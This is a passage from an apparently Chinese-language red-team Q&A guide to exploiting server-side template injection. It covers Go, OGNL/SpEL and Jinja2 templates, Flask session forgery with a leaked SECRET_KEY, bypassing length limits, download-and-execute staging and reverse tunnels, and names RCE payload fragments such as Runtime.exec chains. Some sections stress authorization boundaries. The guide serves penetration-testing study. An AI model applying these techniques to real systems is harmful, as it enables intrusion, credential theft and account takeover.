**A3**: 这类若能注入服务端代码块同样可执行 VBScript/C#。但更多时候 `<%%>` 是设计态模板不接受运行时用户输入,注入面小。确认是否真把用户输入当模板编译,而非只是显示。
**Q4**: .NET 模板注入打不通,被墙转哪?
**A4**: 转 .NET 正交面:ViewState 反序列化(拿到 machineKey 可伪造)、JSON.NET/BinaryFormatter 反序列化、`__VIEWSTATE` 篡改。SSTI 的任意读若能读 `web.config` 拿 machineKey,直接转 ViewState 链打 RCE,换入口。

### Go text/template 的有限注入
**Q1**: 后端是 Go,`{{7}}` 类语法有反应,Go 模板能 RCE 吗?
**A1**: 关键先分清 `text/template` 还是 `html/template`。Go 模板是"数据驱动"的,不像 Jinja2 能任意求值——它只能访问传入的数据和已注册函数。`{{7*7}}` 甚至不支持算术。别指望像 Python 那样爬链。
**Q2**: 那 Go 模板注入的价值在哪?
**A2**: 主要是信息泄露:`{{.}}` 打印整个上下文数据结构,可能泄露传入模板的敏感对象(用户信息、配置、内部字段)。`{{.Password}}` 类可读出本不该渲染的字段。价值在越权读数据,不是 RCE。
**Q3**: 上下文里恰好注册了危险函数呢?
**A3**: 那就是 RCE 入口——若应用给模板注册了能执行命令/调用系统的自定义函数(`FuncMap` 里),`{{callDangerousFunc}}` 可触发。审计应用注册了哪些模板函数是 Go SSTI 的关键。
**Q4**: Go 模板确认只能读数据无法 RCE,被墙转哪?
**A4**: 转"数据泄露最大化+换洞"。用 `{{.}}`/字段遍历把上下文敏感数据榨干(可能含 token/内部结构),喂给其他攻击。RCE 走 Go 应用的其他面(SSRF、路径遍历、反序列化),别在 Go 模板上强求 RCE。

### OGNL / SpEL 表达式注入与模板注入的辨别
**Q1**: 注入点求值了但不像模板语法,更像纯表达式(如 Struts 的 OGNL),怎么辨别?
**A1**: 分清"模板引擎"和"表达式引擎"。OGNL(Struts2/OGNL)、SpEL(Spring)是表达式语言,注入形态是参数值被当表达式求值(如 `%{7*7}`、`#{7*7}`),不一定有模板标签。判据:注入点是否在 Struts 参数名/OGNL 上下文、Spring 的 `@Value`/SpEL 求值处。
**Q2**: 确认是 OGNL,RCE 骨架?
**A2**: OGNL 经典走 `#context`/`@java.lang.Runtime@getRuntime().exec()`,需先绕 Struts 的安全上下文(`_memberAccess`)。历史上多个 Struts2 S2-xxx 就是 OGNL 沙箱绕过。核心是设置 `allowStaticMethodAccess` 或用 `(new ...)`。
**Q3**: 是 SpEL 呢?
**A3**: SpEL 走 `T(java.lang.Runtime).getRuntime().exec(...)` 或 `new ProcessBuilder(...)`,和 Thymeleaf 内的 SpEL 同源。注入点常在 Spring 的表达式求值场景(`@Value`、Spring Security 表达式、SpEL API 误用)。
**Q4**: OGNL/SpEL 沙箱绕不过,被墙转哪?
**A4**: 转版本对应的已知绕过链(Struts2/Spring 的沙箱绕过有明确 CVE 谱系,按版本选),或降级用表达式做信息泄露/SSRF。再不行换应用其他洞。把它当"表达式注入"而非"模板注入"来查资料,方向才对。

### Jinja2 密钥泄露到会话伪造的完整链
**Q1**: Jinja2 能读 config 但 RCE 被沙箱挡,读到了 Flask `SECRET_KEY`,下一步怎么把它变权限提升?
**A1**: SECRET_KEY 是 Flask session 签名密钥。拿到它就能伪造任意 session cookie——把自己的 session 改成 `admin`/提权字段,签名后重放,直接以管理员身份访问。这是"读密钥→伪造身份"的经典升级,不需要 RCE。
**Q2**: 怎么确认伪造成功且找对要伪造的字段?
**A2**: 先解开自己现有 cookie 看结构(用密钥可解),观察里面有哪些字段(user_id/role/is_admin)。改关键字段重签。判据:重放后能访问原本 403 的管理功能即成功。
**Q3**: 读到的是别的框架密钥(Django/Rails)呢?
**A3**: 同理但机制不同:Django 的 SECRET_KEY 可用于伪造签名/密码重置 token;Rails 的 `secret_key_base` 更狠——它签名的 cookie 可能触发反序列化,拿到它常等于 RCE。按框架确定密钥的"最大杀伤用途"。
**Q4**: 密钥读到了但伪造 session 没提权效果(权限不在 cookie 里),被墙转哪?
**A4**: 转密钥的其他用途:签名的密码重置/邮箱验证 token 伪造、CSRF token 预测、加密数据解密。若都无效,回到 SSTI 继续找 RCE 或换洞。密钥是资产,换角度榨其价值,别单吊 session 伪造。

### 输入长度受限时的短 payload 策略
**Q1**: 注入点有长度限制(如只允许几十字符),完整 RCE 链塞不下,怎么办?
**A1**: 先想"能不能把 payload 拆开"。SSTI 常可多请求分步:第一步用短 payload 设置一个变量/写半截,第二步续上。或用参数走私——模板体只写极短的引用,长 payload 放在另一个无长度限制的参数里。
**Q2**: 引擎支持变量赋值,怎么利用来压缩?
**A2**: 用引擎的赋值语法把长表达式拆成多个短赋值累加(Jinja2 的 `{% set %}`、Velocity 的 `#set`、Mako 的代码块),分多次请求构建,最后一次触发。把长度限制从"单次"摊到"多次"。
**Q3**: 只有一次注入机会且长度死限,怎么选最短链?
**A3**: 选引擎最短的全局捷径(Jinja2 用 `lipsum`/`cycler` 直达 os,比 subclasses 短几倍;Mako 直接 `os`)。优先"读一个文件"或"下载执行"这类短原语——用短命令拉一个大 payload 落地再执行,把长度问题外包给第二阶段。
**Q4**: 怎么压都超限,这路被墙转哪?
**A4**: 转别的注入点:同应用其他无长度限制的 SSTI 载体(POST body、header、存储型字段)。长度限制常只在某个前端字段,换入口往往没这限制。

### 多层渲染时定位真正的渲染层
**Q1**: 请求经前端→网关→多个微服务,SSTI 求值了但不知在哪层渲染,怎么定位?
**A1**: 用带外分层探针:在 payload 里埋能发 DNS/HTTP 回连的表达式,看回连来自哪个出口 IP——那就是真正渲染的服务所在网段。不同层出口 IP 不同,一测即知。
**Q2**: 为什么必须知道是哪层渲染?
**A2**: 因为渲染层决定:用哪个引擎的利用链、RCE 落在哪台机器、能触达什么内网、出网策略如何。打错层的 payload 无效,拿到的立足点价值也取决于是边缘网关还是核心服务。
**Q3**: 回连信息也被网关统一出口抹平,分不清层,怎么办?
**A3**: 转错误/延时的层级特征:不同层的错误页格式、响应延时基线、超时行为不同。或在 payload 里读环境标识(主机名、内部 IP、环境变量)判断落点。让 RCE 后的第一条命令就是 `hostname`/`ip a` 自报家门。
**Q4**: 确认渲染在深层内网服务(前面隔了好几跳),够不到二次利用,被墙转哪?
**A4**: 转"以渲染层为跳板"思路:既然能在深层服务执行,就用它起反向隧道/代理回连,把深层立足点变内网入口。够不到不是问题,让它主动连出来。若出网也被封,走 SSTI 的 HTTP 心跳式命令通道(经原请求链路回传)。

### 探针幂等性:避免破坏页面导致无法复测
**Q1**: 我担心 payload 有副作用(改数据、报错锁死功能),导致注入点用一次就废,怎么设计探针?
**A1**: 探测阶段坚持"只读、幂等、无副作用"原则:用 `{{7*7}}` 纯计算、`{{7*'7'}}` 纯字符串,绝不在探测期发写操作、删除、状态变更类 payload。先确认求值和引擎,再谨慎升级到有副作用的利用。
**Q2**: 注入点是"保存后展示"的存储型,反复注入会污染数据,怎么办?
**A2**: 用唯一可回收的标记:每次注入带独特随机串便于识别和后续清理;优先在测试账号/沙箱数据上操作;记录每次注入的位置以便复现和清场。避免污染生产数据同时保证可追溯。
**Q3**: payload 触发了 500 让整个功能不可用,后续测不了,怎么恢复?
**A3**: 若是把畸形数据存进了库导致每次加载都崩,需要用合法值覆盖回去恢复功能。所以有副作用的利用前要想好"回滚路径"。探测期用不落库的传参(GET/临时)优先于落库字段。
**Q4**: 已经把注入点搞崩了无法复测,被墙转哪?
**A4**: 转同类其他注入点(同功能其他字段/其他接口常有同款洞),或换会话/环境重来。同时把这次教训固化:后续对高价值点先在旁路验证再动主目标。红队要保护自己的攻击面不被自己弄坏。

### 授权边界与爆炸半径控制
**Q1**: SSTI 眼看能 RCE,动手前从"比赛/授权"角度要先想什么?
**A1**: 先想爆炸半径。RCE 第一条命令绝不能是破坏性的(`rm`、改数据、停服务)。先做无害侦察(`whoami`/`id`/`hostname`),确认落点、权限、是否在授权范围内,再决定下一步。红队的专业性体现在克制。
**Q2**: 拿到 shell 发现这是生产系统且有真实用户数据,怎么把握分寸?
**A2**: 遵循"证明可利用即止"原则:目标是证明风险(能读到什么、能到哪),而非造成损害。避免下载真实用户敏感数据、避免持久破坏。截取最小 PoC 证据(如读到配置的部分掩码内容)即可。
**Q3**: 反弹 shell / 种后门会不会越界?
**A3**: 视授权范围而定。若授权含后渗透则可,但要用可控、可回收的通道并做好清场记录;若只授权到"证明 RCE",则拿到执行证据即停。动作前对照授权书边界。
**Q4**: 发现能横向到授权范围外的系统,被"墙"(边界)挡住怎么办?
**A4**: 这不是技术墙是授权墙——停在边界,记录"存在横向路径"作为发现上报,不越界实操。转向:在授权范围内继续深化,把越界部分写进报告让客户知晓风险。合规是红队不可逾越的红线。

### 用 SSTI 读到源码后的白盒化回灌
**Q1**: SSTI 能读文件,我读到了应用源码,怎么把黑盒打法升级成白盒?
**A1**: 立刻从"猜"转"看"。读源码定位:模板渲染的确切代码(确认引擎/沙箱配置)、其他未发现的注入点和危险函数、硬编码密钥/凭证、内部接口和鉴权逻辑。白盒化让后续每一步都有依据,大幅提速。
**Q2**: 优先读哪些文件?
**A2**: 按 ROI:入口配置(路由/中间件/框架配置)、含密钥的配置文件、认证鉴权模块、处理用户输入的控制器、依赖清单(找已知漏洞组件)。目标是快速建立应用的攻击面地图。
**Q3**: 读到源码发现当前 SSTI 点的沙箱确实堵死,白盒下怎么找新突破?
**A3**: 源码里找其他洞:反序列化点、命令拼接、SQL 拼接、其他模板渲染点(防护不一致)、鉴权缺陷。白盒下漏洞审计效率远高于黑盒盲打,SSTI 读源码的最大价值就是把整个应用摊开审。
**Q4**: 源码是编译产物/加密看不了,读文件白盒化受阻,被墙转哪?
**A4**: 转读运行时可读的信息:配置文件、日志、环境变量、`/proc`、依赖库文件(反编译/查已知 CVE)。读不到源码就读"环境和依赖",同样能推断攻击面。或回到黑盒继续,白盒只是加速器不是唯一路。

### 单点时间盒与转向节奏(元决策)
**Q1**: 我在一个 SSTI 点已经耗了很久还没打通,怎么判断该继续还是转向?
**A1**: 设时间盒。给单点设明确预算(如若干轮尝试/固定时长),到点强制评估:是否有进展趋势(逐步绕过更多过滤)还是原地打转。有趋势可续,原地打转就挂起转其他面,避免沉没成本陷阱。
**Q2**: 怎么判断这个点"值不值得死磕"?
**A2**: 权衡三因素:该点打通的收益(能到 RCE/核心数据吗)、当前受阻的性质(是缺一个 payload 技巧,还是需要 0day)、是否有替代路径(别处有更易的洞吗)。高收益+缺技巧 → 续;低收益或需 0day+有替代 → 转。
**Q3**: 转走之后这个点要不要留记录?
**A3**: 必须。把"确认有 SSTI 但受某防护阻挡"作为情报留存(引擎、版本、卡在哪、已试过什么),后续拿到新信息(如读到源码、找到密钥)可回头再攻。挂起≠放弃,是排期。
**Q4**: 所有路径都卡住了(全被墙),整体节奏怎么走?
**A4**: 转"广度重扫":回到信息收集,扩大攻击面(新子域/新端口/新功能/新参数),常有未测的注入点。红队卡死时的标准动作是回退到侦察拓面,而非在死点硬耗。深度打不动就换广度。

### 自动化 SSTI 工具的使用时机与局限
**Q1**: 手工探针慢,要不要直接上自动化 SSTI 工具(tplmap 类)一把梭?
**A1**: 分场景。授权充分、非高防目标、想快速确认时,自动化工具能一次性跑多引擎探针和常见利用链,省手工。但要清楚它的局限:payload 特征明显易被 WAF 秒拦、易惊动防护、对非典型注入点(存储型/多层渲染/自定义过滤)基本无效。
**Q2**: 工具跑出"疑似可注入"但没拿到 shell,怎么办?
**A2**: 别只信工具结论。回手工验证工具报的引擎和注入点,自己按引擎特性构造更贴合的 payload。工具擅长"发现",不擅长"绕过特定环境的防护"——最后一公里的沙箱逃逸/WAF 绕过几乎都得手工。
**Q3**: 目标有 WAF,自动化工具一跑就被封 IP,这路被墙怎么转?
**A3**: 转纯手工低速探测:自己设计幂等、编码、分诊的最小探针,控制频率和特征。高防环境下自动化工具是负资产(暴露快、命中低)。手工的隐蔽和灵活此时是唯一可行路。
**Q4**: 工具和手工都确认有 SSTI 但都打不通利用,整体转向?
**A4**: 回到根因三分诊(沙箱/黑名单/环境限制)逐项判性质,再决定走逃逸、绕过还是降级榨取价值。工具打不通只说明"标准链无效",不代表洞没价值——转手工深挖或换攻击面,别因工具失败就判死刑。
